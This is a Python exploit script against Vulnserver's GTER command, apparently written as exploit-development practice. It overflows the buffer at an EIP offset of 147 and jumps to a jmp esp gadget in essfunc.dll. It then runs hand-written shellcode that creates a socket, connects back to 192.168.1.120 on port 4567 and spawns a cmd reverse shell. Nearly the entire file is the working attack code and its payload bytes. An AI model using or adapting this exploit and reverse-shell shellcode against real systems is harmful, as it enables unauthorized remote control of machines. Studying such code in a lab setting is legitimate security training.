#!/usr/bin/python3

import socket

target = "192.168.1.121"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

# EIP offset at 147
# 0x625011d3 : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
# WSASocketA (2, 1, 6, 0, 0, 0)
payload = b"\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x69\x87\xa3\x71\x31\xc0\xff\xd3\x96"
# connect
payload += b"\x68\xc0\xa8\x01\x78\x66\x68\x11\xd7\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\x6a\x40\xa3\x71\xff\xd3"
# CreateProcessA cmd
payload += b"\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x83\xec\x10\x89\xe3\x56\x56\x56\x31\xd2\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x67\x23\x80\x7c\xff\xd3"

print(len(payload))
payload += b"A" * (147 - len(payload))
payload += b"\xd3\x11\x50\x62"

#nasm > mov esp,eax
#00000000  89C4              mov esp,eax
#nasm > add eax, 9
#00000000  83C009            add eax,byte +0x9
#nasm > jmp eax
#00000000  FFE0              jmp eax
payload += b"\x89\xC4\x83\xC0\x09\xFF\xE0"

payload += b"C" * (1000 - len(payload))

s.send(b"GTER /.:/" + payload + b"\n")
s.close()
